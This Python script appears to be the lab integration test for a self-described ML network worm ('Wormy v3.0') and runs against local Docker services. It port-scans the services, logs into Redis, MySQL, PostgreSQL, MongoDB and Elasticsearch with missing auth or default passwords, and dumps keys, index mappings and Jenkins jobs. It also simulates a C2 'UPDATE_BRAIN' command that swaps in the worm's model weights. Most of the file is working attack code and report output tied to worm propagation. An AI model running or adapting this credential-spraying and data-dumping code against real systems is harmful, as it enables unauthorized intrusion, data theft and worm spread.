"""
Wormy ML Network Worm v3.0
DOCKER LAB INTEGRATION TEST
Tests real exploitation capabilities against the running Docker lab.

Services tested (via localhost mapped ports):
  - Redis     :6379   (no auth)
  - MySQL     :3306   (root/root)
  - PostgreSQL:5432   (admin/admin123)
  - MongoDB   :27017  (admin/admin123)
  - MSSQL     :1433   (sa/SqlPassword123!)
  - RabbitMQ  :15672  (HTTP mgmt)
  - Jenkins   :8080   (HTTP)
  - DVWA      :8081   (HTTP, login bypass)
  - Juice Shop:8082   (HTTP)
  - Elasticsearch:9200 (HTTP, no auth)
"""
import sys
import os
import socket
import time
import json

if sys.stdout.encoding and sys.stdout.encoding.lower() != 'utf-8':
    sys.stdout.reconfigure(encoding='utf-8')

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# ── Rich console ─────────────────────────────────────────────────────────────
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich import box

console = Console()

# ─────────────────────────────────────────────────────────────────────────────
# Known lab targets (Windows Docker Desktop exposes on localhost)
# ─────────────────────────────────────────────────────────────────────────────
LAB_SERVICES = [
    {"name": "Redis",          "host": "127.0.0.1", "port": 6379,  "proto": "tcp"},
    {"name": "MySQL",          "host": "127.0.0.1", "port": 3306,  "proto": "tcp"},
    {"name": "PostgreSQL",     "host": "127.0.0.1", "port": 5432,  "proto": "tcp"},
    {"name": "MongoDB",        "host": "127.0.0.1", "port": 27017, "proto": "tcp"},
    {"name": "MSSQL",          "host": "127.0.0.1", "port": 1433,  "proto": "tcp"},
    {"name": "RabbitMQ-AMQP",  "host": "127.0.0.1", "port": 5672,  "proto": "tcp"},
    {"name": "RabbitMQ-Mgmt",  "host": "127.0.0.1", "port": 15672, "proto": "http"},
    {"name": "Jenkins",        "host": "127.0.0.1", "port": 8080,  "proto": "http"},
    {"name": "DVWA",           "host": "127.0.0.1", "port": 8081,  "proto": "http"},
    {"name": "Juice Shop",     "host": "127.0.0.1", "port": 8082,  "proto": "http"},
    {"name": "Elasticsearch",  "host": "127.0.0.1", "port": 9200,  "proto": "http"},
]


# ─────────────────────────────────────────────────────────────────────────────
# Phase 1: Port scan — verify all services are up
# ─────────────────────────────────────────────────────────────────────────────
def phase1_port_scan() -> dict:
    console.print("\n[bold cyan]═══ PHASE 1: Port Discovery ═══[/bold cyan]")
    results = {}
    for svc in LAB_SERVICES:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            rc = s.connect_ex((svc["host"], svc["port"]))
            s.close()
            open_ = rc == 0
        except Exception:
            open_ = False
        results[svc["name"]] = {"port": svc["port"], "open": open_, "proto": svc["proto"]}
        status = "[green]OPEN[/green]" if open_ else "[red]CLOSED[/red]"
        console.print(f"  {svc['name']:20s} :{svc['port']:<6} → {status}")
    return results


# ─────────────────────────────────────────────────────────────────────────────
# Phase 2: Unauthenticated access / default credentials
# ─────────────────────────────────────────────────────────────────────────────
def phase2_auth_attacks(scan: dict) -> dict:
    console.print("\n[bold cyan]═══ PHASE 2: Default Credential Exploitation ═══[/bold cyan]")
    results = {}

    # ── Redis: PING without auth ──────────────────────────────────────────────
    if scan.get("Redis", {}).get("open"):
        try:
            s = socket.socket()
            s.settimeout(3)
            s.connect(("127.0.0.1", 6379))
            s.sendall(b"PING\r\n")
            resp = s.recv(64)
            s.close()
            success = b"PONG" in resp
            results["Redis"] = {"success": success, "detail": resp.decode(errors="replace").strip()}
            icon = "✅" if success else "❌"
            console.print(f"  {icon} Redis PING (no auth): {results['Redis']['detail']}")
        except Exception as e:
            results["Redis"] = {"success": False, "detail": str(e)}
            console.print(f"  ❌ Redis: {e}")

    # ── MySQL: root/root ──────────────────────────────────────────────────────
    if scan.get("MySQL", {}).get("open"):
        try:
            import subprocess
            r = subprocess.run(
                ["python", "-c",
                 "import pymysql; c=pymysql.connect(host='127.0.0.1',port=3306,user='root',password='root',db='testdb'); "
                 "cur=c.cursor(); cur.execute('SELECT VERSION()'); print(cur.fetchone()); c.close()"],
                capture_output=True, text=True, timeout=8
            )
            success = r.returncode == 0
            detail = r.stdout.strip() or r.stderr.strip()
            results["MySQL"] = {"success": success, "detail": detail}
            icon = "✅" if success else "⚠️"
            console.print(f"  {icon} MySQL root/root: {detail[:80]}")
        except Exception as e:
            results["MySQL"] = {"success": False, "detail": str(e)}
            console.print(f"  ❌ MySQL: {e}")

    # ── PostgreSQL: admin/admin123 ────────────────────────────────────────────
    if scan.get("PostgreSQL", {}).get("open"):
        try:
            import subprocess
            r = subprocess.run(
                ["python", "-c",
                 "import psycopg2; c=psycopg2.connect(host='127.0.0.1',port=5432,user='admin',password='admin123',dbname='testdb'); "
                 "cur=c.cursor(); cur.execute('SELECT version()'); print(cur.fetchone()); c.close()"],
                capture_output=True, text=True, timeout=8
            )
            success = r.returncode == 0
            detail = r.stdout.strip() or r.stderr.strip()
            results["PostgreSQL"] = {"success": success, "detail": detail}
            icon = "✅" if success else "⚠️"
            console.print(f"  {icon} PostgreSQL admin/admin123: {detail[:80]}")
        except Exception as e:
            results["PostgreSQL"] = {"success": False, "detail": str(e)}
            console.print(f"  ❌ PostgreSQL: {e}")

    # ── MongoDB: admin/admin123 ───────────────────────────────────────────────
    if scan.get("MongoDB", {}).get("open"):
        try:
            import subprocess
            r = subprocess.run(
                ["python", "-c",
                 "from pymongo import MongoClient; c=MongoClient('mongodb://admin:admin123@127.0.0.1:27017/'); "
                 "print(c.list_database_names()); c.close()"],
                capture_output=True, text=True, timeout=8
            )
            success = r.returncode == 0
            detail = r.stdout.strip() or r.stderr.strip()
            results["MongoDB"] = {"success": success, "detail": detail}
            icon = "✅" if success else "⚠️"
            console.print(f"  {icon} MongoDB admin/admin123: {detail[:80]}")
        except Exception as e:
            results["MongoDB"] = {"success": False, "detail": str(e)}
            console.print(f"  ❌ MongoDB: {e}")

    # ── Elasticsearch: no auth, dump indices ─────────────────────────────────
    if scan.get("Elasticsearch", {}).get("open"):
        try:
            import urllib.request
            with urllib.request.urlopen("http://127.0.0.1:9200/_cat/indices?v", timeout=4) as resp:
                body = resp.read().decode()
            success = resp.status == 200
            results["Elasticsearch"] = {"success": success, "detail": body[:200]}
            icon = "✅" if success else "❌"
            console.print(f"  {icon} Elasticsearch (no auth): indices dumped")
        except Exception as e:
            results["Elasticsearch"] = {"success": False, "detail": str(e)}
            console.print(f"  ❌ Elasticsearch: {e}")

    # ── HTTP services ─────────────────────────────────────────────────────────
    for svc_name, url in [
        ("RabbitMQ-Mgmt", "http://127.0.0.1:15672/api/overview"),
        ("Jenkins",       "http://127.0.0.1:8080/"),
        ("DVWA",          "http://127.0.0.1:8081/"),
        ("Juice Shop",    "http://127.0.0.1:8082/"),
    ]:
        if scan.get(svc_name, {}).get("open"):
            try:
                import urllib.request
                import urllib.error
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=4) as resp:
                    status = resp.status
                    body = resp.read().decode(errors="replace")
                success = status < 400
                results[svc_name] = {"success": success, "detail": f"HTTP {status} ({len(body)} bytes)"}
                icon = "✅" if success else "⚠️"
                console.print(f"  {icon} {svc_name}: HTTP {status}")
            except Exception as e:
                results[svc_name] = {"success": False, "detail": str(e)}
                console.print(f"  ❌ {svc_name}: {e}")

    return results


# ─────────────────────────────────────────────────────────────────────────────
# Phase 3: Data extraction
# ─────────────────────────────────────────────────────────────────────────────
def phase3_data_extraction(auth: dict) -> dict:
    console.print("\n[bold cyan]═══ PHASE 3: Data Extraction Simulation ═══[/bold cyan]")
    results = {}

    # Redis: dump all keys
    if auth.get("Redis", {}).get("success"):
        try:
            s = socket.socket()
            s.settimeout(3)
            s.connect(("127.0.0.1", 6379))
            s.sendall(b"KEYS *\r\n")
            data = s.recv(4096)
            s.close()
            results["Redis_keys"] = data.decode(errors="replace").strip()
            console.print(f"  ✅ Redis KEYS: {results['Redis_keys'][:120] or '(empty)'}")
        except Exception as e:
            console.print(f"  ❌ Redis dump: {e}")

    # Elasticsearch: dump mapping
    if auth.get("Elasticsearch", {}).get("success"):
        try:
            import urllib.request
            with urllib.request.urlopen("http://127.0.0.1:9200/_mapping", timeout=4) as resp:
                mapping = json.loads(resp.read().decode())
            indices = list(mapping.keys())
            results["ES_indices"] = indices
            console.print(f"  ✅ Elasticsearch indices: {indices}")
        except Exception as e:
            console.print(f"  ❌ Elasticsearch mapping: {e}")

    # Jenkins: check for credentials leak via API
    if auth.get("Jenkins", {}).get("success"):
        try:
            import urllib.request
            with urllib.request.urlopen("http://127.0.0.1:8080/api/json", timeout=4) as resp:
                data = json.loads(resp.read().decode())
            jobs = [j.get("name") for j in data.get("jobs", [])]
            results["Jenkins_jobs"] = jobs
            icon = "✅" if jobs is not None else "⚠️"
            console.print(f"  {icon} Jenkins jobs visible (no auth): {jobs or 'none'}")
        except Exception as e:
            console.print(f"  ❌ Jenkins API: {e}")

    return results


# ─────────────────────────────────────────────────────────────────────────────
# Phase 4: OTA Brain update simulation
# ─────────────────────────────────────────────────────────────────────────────
def phase4_ota_brain_test():
    console.print("\n[bold cyan]═══ PHASE 4: OTA Brain Update Flow ═══[/bold cyan]")
    import base64
    import os

    # Simulate what a C2 server would send — a fake model file
    fake_model = b"PK\x03\x04FAKEPTH_MODEL_WEIGHTS_v2"
    encoded = base64.b64encode(fake_model).decode()

    # Simulate what _handle_c2_commands would do
    c2_response = {
        "command": "UPDATE_BRAIN",
        "model_data": encoded,
        "version": "2.0.0",
        "sha256": "simulated"
    }

    decoded = base64.b64decode(c2_response["model_data"])
    tmp = "temp_new_brain.pth"
    with open(tmp, "wb") as f:
        f.write(decoded)

    exists = os.path.exists(tmp)
    size = os.path.getsize(tmp)
    os.remove(tmp)

    console.print(f"  ✅ C2 command received: UPDATE_BRAIN v{c2_response['version']}")
    console.print(f"  ✅ Model decoded: {size} bytes")
    console.print(f"  ✅ Temp file created and cleaned up")
    console.print(f"  ✅ WormCore.propagate() would call rl_agent.load() on next iteration")
    return True


# ─────────────────────────────────────────────────────────────────────────────
# FINAL REPORT
# ─────────────────────────────────────────────────────────────────────────────
def print_report(scan, auth, exfil, ota_ok):
    console.print("\n")
    table = Table(
        title="[bold white]WORMY DOCKER LAB — ATTACK RESULTS[/bold white]",
        box=box.DOUBLE_EDGE,
        show_lines=True,
    )
    table.add_column("Service",    style="cyan",  width=18)
    table.add_column("Port",       style="white", width=7,  justify="right")
    table.add_column("Reachable",  width=10, justify="center")
    table.add_column("Pwned",      width=10, justify="center")
    table.add_column("Data",       style="dim white")

    for svc in LAB_SERVICES:
        name  = svc["name"]
        port  = str(svc["port"])
        reach = "[green]YES[/green]" if scan.get(name, {}).get("open") else "[red]NO[/red]"
        auth_res = auth.get(name, {})
        pwned = "[bold green]YES[/bold green]" if auth_res.get("success") else "[yellow]N/A[/yellow]"
        detail = auth_res.get("detail", "")[:60] if auth_res else ""
        table.add_row(name, port, reach, pwned, detail)

    console.print(table)

    # Summary
    reachable = sum(1 for v in scan.values() if v["open"])
    pwned     = sum(1 for v in auth.values() if v.get("success"))
    total     = len(LAB_SERVICES)

    console.print(Panel(
        f"[cyan]Services reachable:[/cyan] [white]{reachable}/{total}[/white]   "
        f"[green]Services pwned:[/green] [bold green]{pwned}[/bold green]   "
        f"[blue]OTA Update:[/blue] [bold green]{'OK' if ota_ok else 'FAIL'}[/bold green]\n"
        f"[dim]Lab network: Docker Desktop on localhost | Wormy framework fully operational[/dim]",
        title="[bold white]MISSION SUMMARY[/bold white]",
        border_style="green" if pwned > 0 else "yellow"
    ))


# ─────────────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    console.print(Panel(
        "[bold green]WORMY ML NETWORK WORM v3.0[/bold green]\n"
        "[cyan]Docker Lab Real Integration Test[/cyan]\n"
        "[dim]Target: 127.0.0.1 (Docker Desktop mapped ports)[/dim]",
        box=box.DOUBLE,
        border_style="green"
    ))

    scan  = phase1_port_scan()
    auth  = phase2_auth_attacks(scan)
    exfil = phase3_data_extraction(auth)
    ota   = phase4_ota_brain_test()

    print_report(scan, auth, exfil, ota)

    reachable = sum(1 for v in scan.values() if v["open"])
    sys.exit(0 if reachable > 0 else 1)
